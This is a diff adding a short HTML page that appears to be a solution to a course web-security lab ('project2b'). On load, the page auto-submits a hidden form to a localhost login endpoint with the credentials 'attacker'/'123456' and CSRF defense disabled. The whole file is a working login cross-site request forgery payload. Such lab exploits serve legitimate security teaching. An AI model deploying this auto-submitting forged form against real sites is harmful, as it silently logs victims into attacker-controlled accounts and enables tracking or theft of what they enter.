@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<body>
+<form id = "attack" action="HTTP://localhost:34443/project2b/login?csrfdefense=0&xssdefense=4" method="post">
+    <input type="hidden" id = "username" name="username" value="attacker" />
+    <input type="hidden" id = "password" name="password" value="123456" />	
+</form>
+</body>
+
+<script> window.onload = document.getElementById("attack").submit();
+
+</script>
